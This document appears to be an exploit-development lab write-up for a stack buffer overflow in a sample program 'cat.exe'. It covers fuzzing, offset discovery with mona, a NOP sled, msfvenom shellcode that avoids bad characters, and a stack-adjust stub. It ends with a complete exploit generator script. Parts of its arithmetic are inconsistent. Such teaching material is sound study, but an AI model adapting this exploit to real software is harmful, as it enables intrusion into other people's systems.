# Stack exploitation: `cat.exe`

## Preparations

### .. Tools

* [Notepad++](https://notepad-plus-plus.org)
* [Immunity Debugger](https://www.Immunityinc.com/products/debugger/)
* [Mona.py](https://github.com/corelan/mona) (Place the mona script in the PyCommands folder of Immunity Debugger)
* [MsfVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
  (Part of Kali Linux)
* [Python](https://www.python.org)

### .. Setup

* Place the _Office.exe_ sample in a folder
* Set the workingfolder for _mona_ `!mona config -set workingdirectory C:\path\to\sample` (Enter this command in the textbox, in the bottom, of _Immunity_.)
---
## `fuzz1.py`

### .. Test

 * Create pattern and debug.
```
> fuzz1.py
> ImmunityDebugger.exe cat.exe pattern.dat
```

### .. Result

 * Exception
```
 Log data, item 19
  Address=004012B8
  Message=[20:40:49] Access violation when writing to [001A0000]
```

 * Stack at `0x19FFFC` (`0x1A0000 - 4`)
 `0019FFFC   33774232  2Bw3`

 * Pattern at `0x19FFFC` -> `2Bw3`
```
0BADF00D   [+] Command used:
0BADF00D   !mona pattern_offset 2Bw3
0BADF00D   Looking for 2Bw3 in pattern of 500000 bytes
0BADF00D    - Pattern 2Bw3 found in cyclic pattern at position 1448
```

### .. Conclusion

 * The pattern caused an exception trying to write beyond the stack boundary.
 * The offset of the last `4` byte pattern was found at offset `1448`.
 * To prevent this exception, the maximum pattern size is `1448 + 4 = 1452`.

> It's good to have a stack overflow.
> It's bad to have an exception caused by writing beyond the stack boundary.
> `fuzz2.py` will try to prevent this exception.
### .. Code for `fuzz1.py`
```python
from pattern import createPattern 

with open('pattern.dat', 'w') as f:
	f.write(createPattern(8192))
```
---
## `fuzz2.py`

### .. Test

* Prevent to have a stack underflow exception, which is 
  caused by writing beyond the stack boundary (see fuzz1.py).

```
> fuzz2.py
> ImmunityDebugger.exe cat.exe pattern.dat
```

### .. Result

 * Exception
```
Log data, item 6
 Address=004012C9
 Message=[21:13:28] Access violation when writing to [001A0000]
```
 
 * **Exception the same as with `fuzz1.py` !**

 * Code at line of exception 
```
004012C9  |. C60439 00      MOV BYTE PTR DS:[ECX+EDI],0
```

 * Registers
```
ECX 000005AC
EDI 0019FA54 
```

 * `ECX + EDI = 0x19FA54 + 0x5AC = 0x1A0000`
 
### .. Conclusion

 * The same exception as with `fuzz1.py`
 * The string was not longer than the stack boundary.
 * The instruction tries to move zero beyond the stack boundary.

> Many programs and functions use zero terminated strings.
  The pattern didn't leave space for this zero byte.
  `fuzz3.py` will try to prevent this exception.
### .. Code for `fuzz2.py`
```python
from pattern import createPattern

position = 1448
maximum = position + 4
pattern = createPattern(maximum)

with open('pattern.dat', 'w') as f:
	f.write(pattern)
```
---
## `fuzz3.py`

### .. Test

* Prevent to have a stack underflow exception, which is 
  caused by writing beyond the stack boundary (see fuzz2.py).

```
> fuzz3.py
> ImmunityDebugger.exe cat.exe pattern.dat
```

### .. Result

 * Exception
```
Log data, item 0
 Address=33694232
 Message=[21:34:06] Access violation when executing [33694232]
```
 
 * Registers
```
EIP 33694232
```

 * Trying to execute memory at `33694232`. 
 _Looks alphanumeric, part of the pattern?_

```
0BADF00D   [+] Command used:
0BADF00D   !mona pattern_offset 33694232
0BADF00D   Looking for 2Bi3 in pattern of 500000 bytes
0BADF00D    - Pattern 2Bi3 (0x33694232) found in cyclic pattern at position 1028
```

 * Where exactly in the stack is this?
```
0BADF00D   [+] Command used:
0BADF00D   !mona find -s 2Bi3
...
0BADF00D   [+] Results :
0019FE58     0x0019fe58 : 2Bi3 | startnull {PAGE_READWRITE} [Stack] <-- !!! STACK !!!
02614374     0x02614374 : 2Bi3 | ascii {PAGE_READWRITE}
0BADF00D       Found a total of 2 pointers
```

 * Perfect stack...
```
...
0019FA50   00000D0A  ....
0019FA54   41306141  Aa0A <-- !!! PATTERN START !!!
0019FA58   61413161  a1Aa
...
0019FE54   69423169  i1Bi
0019FE58   33694232  2Bi3 <-- !!! EXECUTED ADDRESS !!!
0019FE5C   42346942  Bi4B
...
0019FFF8   77423177  w1Bw 
0019FFFC   00774232  2Bw. <-- !!! PATTERN END !!!
001A0000                  <-- !!! STACK END !!!
```

 * And the other stack offsets are `0` and `1447` 
```
0BADF00D   [+] Command used:
0BADF00D   !mona pattern_offset Aa0A
0BADF00D   Looking for Aa0A in pattern of 500000 bytes
0BADF00D    - Pattern Aa0A found in cyclic pattern at position 0
...
0BADF00D   [+] Command used:
0BADF00D   !mona pattern_offset w2Bw
0BADF00D   Looking for w2Bw in pattern of 500000 bytes
0BADF00D    - Pattern w2Bw found in cyclic pattern at position 1447
```

 * `1147 = 1148 - 1`
   Actually
   `1147 = 1152 - sizeOf_dword - sizeOf_char = 1152 - 4 - 1`

### .. Conclusion

 * Our pattern `Aa0A` found in the stack at address `0x`.
 * The address that's executed is at offset `1028` in the pattern.
 * The pattern ends at `1447 + 4 = 1551`.
 
> Is it possible to write shellcode to the stack?
  `fuzz4.py` will try to execute some code...
### .. Code for `fuzz3.py`
```python
from pattern import createPattern

position = 1448
sizeOf_dword = 4
sizeOf_char = 1
maximum = position + sizeOf_dword - sizeOf_char
pattern = createPattern(maximum)

with open('pattern.dat', 'w') as f:
	f.write(pattern)
```
---
## `fuzz4.py`

### .. Test

 * Let our pattern start with a nop sled 0x90 up to, and add a breakpoint 0xCC at, offset 1027.
 * Writing the address of our pattern start to the stack at offset 1028.
 * Execute code?!
 * ...
 * Profit!
 
```
> fuzz3.py
> ImmunityDebugger.exe cat.exe pattern.dat
```
 
### .. Result

```
771A1AD7   [22:45:17] Single step event at ntdll.771A1AD7
00401000   [22:45:22] Program entry point
0019FE57   [22:45:28] INT3 command at 0019FE57 <-- !!! 0xCC INT3 COMMAND !!!
```

### .. Question

 * What caused our address at offset 1028 to be executed?
 
   a. Writing an address to the stack which is used in a call instruction.
   b. Writing an address to the stack which is a return address.
   c. Writing code to the stack that further executes the stack.

### .. Conclusion

 * It's possible to write an address to the stack which is executed.
 * It's possible to write code to the stack which is executed.

> This leaves us with 1028 bytes for a payload to weaponize this exploit.
  See `exploit_cat.py`
### .. Code for `fuzz4.py`
```python
from struct import pack

# start address of our shellcode
address = 0x19FA54
# offset for the address
offset = 1028

with open('pattern.dat', 'w') as f:
	# Nop sled
	f.write("\x90" * (offset - 1)) 
	# Breakpoint
	f.write("\xCC")
	# Address
	f.write(pack('i', address))
```
---
## `fuzz5.py`

 * Load shellcode from a file and generate an exploit.
 * Because the stack might change in later versions,
   a nop sled will be prepended and the address will point to the middle nop.
 * The payload must be in hex format.

### .. Test 1

 * Generate payload, save to payload.dat
```
root@kali:~# msfvenom --payload windows/exec --platform windows --arch x86 -b '\x00' -f hex CMD=\\windows\\notepad.exe 2>/dev/null
ddc6d97424f4bebb27ecb25d29c9b13431751883edfc0375afc5194e278be ...... ecfbab8afa5bc6fcfefe1f8467e7e69ee0d221b7f86bf931e026e3699af6e
```

 * Test
```
> exploit.py payload.dat [exploit.dat]
> ImmunityDebugger.exe cat.exe exploit.dat
```

### .. Result 1

 * A breakpoint on `0x40109C`, after the call to the read function that overwrites the stack,
   reveals that the payload was not completely written to the stack. 
```
00401097  |. E8 04020000    CALL cat.004012A0
0040109C  |. 50             PUSH EAX
```

 * It starts with the nop sled `90909090` but ends 22 bytes further on `FCED`,
   which should be `EDFC` in the payload.
```
0019FD6C   90909090
0019FD70   74D9C6DD
0019FD74   BBBEF424
0019FD78   5DB2EC27
0019FD7C   34B1C929
0019FD80   83187531
0019FD84   0000FCED
0019FD88   00000000
```
   
 * Looking to the payload there is a control char (value < 32) on which the read
   function breaks.
`ddc6d97424f4bebb27ecb25d29c9b13431751883`**`edfc`**___`03`___`75afc5194e278be ...`

### .. Conclusion 1

 * The payload can not contain null chars and control chars.

---
### .. Test 2

 * Generate payload, avoid all control chars.
```
root@kali:~# msfvenom --payload windows/exec --platform windows --arch x86 -b '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F' -f hex CMD=\\windows\\notepad.exe 2>/dev/null
89e6d9cad976f45f5759494949494949494 ...... 3516244546e50655348453545504141r
```

 * Test
```
> exploit.py payload.dat [exploit.dat]
> ImmunityDebugger.exe cat.exe exploit.dat
```

### .. Result 2

 * A breakpoint on the same position shows that the address `0x19FB6A` is written to the stack.
```
0019FE54   41415045  EPAA
0019FE58   0019FB6A  jû.
0019FE5C   02623F40  @?b
```

 * But when the payload code runs we have another exception.
```
00401000   [19:23:01] Program entry point
0040109C   [19:23:04] Breakpoint at cat.0040109C
004010BB   [19:23:05] Breakpoint at cat.004010BB
0019FD58   [19:23:07] Access violation when writing to [00000097]
```

 * This might be caused by the stack pointer [Esp] pointing to the end of the payload.
   As the payload goes upward, executing the payload makes the stack go downward.
   Thus the payload gets overwritten because the stack pointer should point to `0x19FE58 - 1028`

 * Placing a breakpoint on the ret instruction at `0x4010BB` and pressing F7 allows to go to the 
   nop sled.
```
004010BA  |. C9             LEAVE
004010BB  \. C2 0800        RETN 8
```

 * Where this instruction can be assembled manually. 
 * *`0x408 + 0x8 + 0x4 = 0x414` (payload size + retn size + address size)*
 * But `Sub Esp, 0x00000414` contains zeroes, which is solved by `Add Esp, 0xFFFFFBEC`
 * *`0x100000000 - 0x414 = 0xFFFFFBEC`*
 * Right click the at offset  and click *assemble*, enter `Add Esp, 0xFFFFFBEC`.

```
0019FB69   90               NOP
0019FB6A   81C4 ECFBFFFF    ADD ESP,-414
0019FB70   90               NOP
```
 
 * Hit F9, notepad should pop up.

### ... Conclusion 2

 * The payload shoud have code prepended to adjust the stack pointer before executing.
### .. Code for `fuzz5.py`
```python
import argparse
import re
from struct import pack

parser = argparse.ArgumentParser(description='Exploit cat.')
parser.add_argument('payload', type=argparse.FileType('r'), help="The file containing the payload")
parser.add_argument('--exploit', type=argparse.FileType('wb'), default="exploit.dat", help="The output file.")
args = parser.parse_args()

address = 0x19FA54
maximum = 1028

payload = args.payload.read(maximum * 2)
payload = bytearray.fromhex(payload)

nopsize = maximum - len(payload)
middle = int(nopsize / 2)

args.exploit.write("\x90" * nopsize + payload + pack('i', address + middle))

print("Payload name: " + re.search("'(.*)',", str(args.payload)).group(1))
print("Payload size: " + str(len(payload)))
print("Nopsled size: " + str(nopsize))
print("Total size: " + str(nopsize + len(payload)))
print("Mid address: " + hex(address + middle))
print("Exploit created: " + re.search("'(.*)',", str(args.exploit)).group(1))

args.payload.close()
args.exploit.close()
```
---
## `exploit.py`
### .. Code for `exploit.py`
```python
def main():
	import argparse
	import re
	parser = argparse.ArgumentParser(description='Exploit cat.')
	parser.add_argument('payload', type=argparse.FileType('r'), help="The file containing the payload")
	parser.add_argument('--exploit', type=argparse.FileType('wb'), default="exploit.dat", help="The output file.")
	parser.add_argument('--silent', action='store_true', help='No other output.')
	args = parser.parse_args()

	if not args.silent:
		print("   Payload name: " + re.search("'(.*)',", str(args.payload)).group(1))

	payload = args.payload.read(0x1000)
	payload = bytearray.fromhex(payload)
	args.exploit.write(generate(payload, vars(args)))
	
	if not args.silent:
		print("Exploit created: " + re.search("'(.*)',", str(args.exploit)).group(1))

	args.payload.close()
	args.exploit.close()

def generate(payload, args={}):
	'''
	Generates an exploit for cat.exe
	
	Arguments
	  payload: bytearray containing the payload.
	
	Returns
	  An exploit for cat.exe
	  
	'''
	from struct import pack
	
	args["silent"] = args["silent"] if "silent" in args else True
	
	address = 0x19FA54
	maximum = 1028

	stub =  b"\x81\xC4\xEC\xFB\xFF\xFF"
	
	if len(payload) > maximum - len(stub):
		if not args["silent"]:
			print("Payload size is too large...")
		exit()
	
	nopsize = maximum - len(payload) - len(stub)
	middle = int(nopsize / 2)

	if not args["silent"]:
		print("   Payload size:  " + str(len(payload)))
		print("      Stub size:    " + str(len(stub)))
		print("  Nop sled size:  " + str(nopsize))
		print("     Total size: " + str(nopsize + len(payload) + len(stub)))
		print("    Mid address: " + hex(address + middle))
		
	return b"\x90" * nopsize + stub + payload + pack('i', address + middle)

if __name__ == "__main__": main()
```
---
